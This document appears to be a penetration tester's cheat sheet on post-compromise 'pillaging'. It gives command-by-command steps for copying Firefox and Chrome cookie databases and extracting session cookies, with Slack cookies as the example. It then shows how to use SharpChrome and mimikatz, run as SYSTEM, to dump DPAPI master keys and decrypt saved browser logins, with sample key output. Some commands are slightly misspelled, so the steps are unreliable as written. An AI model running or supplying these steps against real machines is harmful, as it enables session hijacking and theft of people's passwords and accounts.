## What is Pillaging?
Pillaging is the ex-filtration of data after we got access to a system. Aka scounting for more information that can be useful.

### Extract Cookies from Firefox 
(Might be either in Appdata\Local or Appdata\Roaming)
Default path:  `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`
1) Get the cookie DB: 
```
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
3) Extract the info: https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
```
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```
(In this example we targeted slack cookies)

OR use this one as well: https://github.com/jdallien/cookie_extractor
```
cookie_extractor /path/to/firefox/cookies.sqlite > cookies.txt
```


## Extract cookies from Chrome
Reference: https://github.com/djhohnstein/SharpChromium
The tool does all the job for you!
If you get an error then you may check that tool is pointing to right path, by default tool checks in path:  `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`
But sometimes it can be somewhere else ex:  `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies`
To Bypass this problem copy cookies from one folder to other:
```
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```
Then rerun the tool 

### ALTERNATIVE:
Sometimes the previous tool will fail if you are not logged in as the user since it don't know where to fetch the APPDATA path so you have to use another tool called SharpChrome.exe.
Reference: https://github.com/GhostPack/SharpDPAPI#sharpchrome-command-line-usage
1)Upload the tool on the machine
2)Check for logins: 
```
Sharpchrome.exe logins /target:C:\Users\USER\ /format:table
```
3)You might get
```
--AES STATE KEY NEEDED-- error
```
4)Writedown the Masterkey used, from step 2 ex:
```
[*] AES state key file : C:\Users\marcus\\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : MasterKey needed - {12cc85b6-0387-4828-bf8a-bd1aae9d8640}
```
5)Run mimikatz as NT System and get all the DPAPI keys:
```
sekur::DPAPI
	 [00000002]
	 * GUID      :	{12cc85b6-0387-4828-bf8a-bd1aae9d8640}
	 * Time      :	16/09/2023 05:35:38
	 * MasterKey :	9a1d05826ba4996fff4247152075f389a38b0a97f07763dd4adaa99177b4e04cef644b33dc3e4fbc211b6d16d3b343ede06be50f3d89e82d2d5480567d2a8737
	 * sha1(key) :	16d12320c82f9003df73aedb67694bbcdd3699b5
```
6)Write down the GUID and SHA1 of the key that matches the step 4
7)Decrypt againg by indicatind GUID:SHA1 from STEP 5
```
logins: Sharpchrome.exe logins /target:C:\Users\USER\ /format:table {GUID}:SHA1
```
